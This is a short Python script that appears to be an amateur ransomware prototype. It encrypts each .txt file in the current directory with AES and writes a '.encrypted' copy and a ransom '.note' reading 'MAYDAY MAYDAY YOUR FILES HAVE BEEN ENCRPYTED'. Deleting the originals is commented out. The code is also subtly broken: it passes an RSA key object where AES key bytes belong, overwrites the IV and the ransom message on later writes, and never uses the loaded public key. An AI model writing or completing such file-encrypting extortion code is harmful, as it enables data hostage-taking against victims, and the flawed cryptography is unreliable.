from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from pathlib import Path

cwd = Path(".")

files = list(Path("./").iterdir())


pub_key = RSA.import_key(Path("./e.key").read_text("utf8"))

rsa_key = RSA.generate(1024)
key = get_random_bytes(32)
iv = get_random_bytes(16)
cipher = AES.new(rsa_key, AES.MODE_CBC, iv)
encrypted_data = cipher.encrypt(pad(rsa_key, 16))

f = open("./k.key", "wb")
f.write(encrypted_data)
f.close()


for file in files:
    if file in cwd.glob("*.txt"):
        contents = file.read_bytes()
        key = get_random_bytes(32)
        iv = get_random_bytes(16)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(pad(contents, 16))

        encrypted_file = Path(
            str(file) + ".encrypted",
        )
        encrypted_file.touch()
        encrypted_file.write_bytes(iv)
        encrypted_file.write_bytes(encrypted_data)
        
        note_file = Path(str(file)+".note")
        note_file.write_text("MAYDAY MAYDAY YOUR FILES HAVE BEEN ENCRPYTED\n", "utf8")
        note_file.write_text(str(key),"utf8")
        # file.unlink()